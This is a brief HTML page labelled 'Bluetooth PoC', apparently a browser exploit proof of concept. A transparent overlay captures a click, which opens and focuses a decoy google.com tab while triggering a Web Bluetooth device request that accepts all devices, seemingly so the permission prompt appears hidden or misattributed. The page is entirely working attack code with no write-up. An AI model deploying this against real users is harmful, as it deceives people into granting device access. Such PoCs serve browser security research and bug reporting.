<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Bluetooth PoC</title>
<style>
  html, body {
    margin: 0;
    height: 100%;
  }
  #overlay {
    position: fixed;
    inset: 0;
    background: transparent;
    z-index: 9999;
  }
</style>
</head>
<body>

<h1 style="text-align:center;">Click anywhere</h1>
<div id="overlay"></div>

<script>
const overlay = document.getElementById('overlay');

overlay.addEventListener('click', () => {
  try {
    // 1. Open new tab first (inside gesture)
    const newTab = window.open('https://www.google.com', '_blank');

    // 2. Bluetooth request (NO await)
    navigator.bluetooth.requestDevice({
      acceptAllDevices: true
    });

    // 3. Focus new tab
    if (newTab) newTab.focus();

  } catch (e) {
    console.log(e);
  }
}, { once: true });
</script>

</body>
</html>
